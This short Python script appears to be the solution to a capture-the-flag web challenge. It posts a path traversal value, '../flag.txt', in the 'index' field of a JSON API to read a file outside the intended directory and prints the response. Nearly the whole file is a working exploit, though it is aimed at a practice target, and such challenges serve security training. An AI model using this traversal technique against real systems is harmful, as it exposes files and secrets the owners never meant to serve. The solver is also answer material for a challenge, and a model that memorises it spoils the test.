#!/usr/bin/env python3

import os
import requests
import logging
logging.disable()

URL = os.environ.get("URL", "http://travel.ctf.pascalctf.it")
if URL.endswith("/"):
   URL = URL[:-1]

def main():
   r = requests.post(f"{URL}/api/get_json", json={
      "index": "../flag.txt"
   })
   return r.text.strip()

if __name__ == "__main__":
   print(main())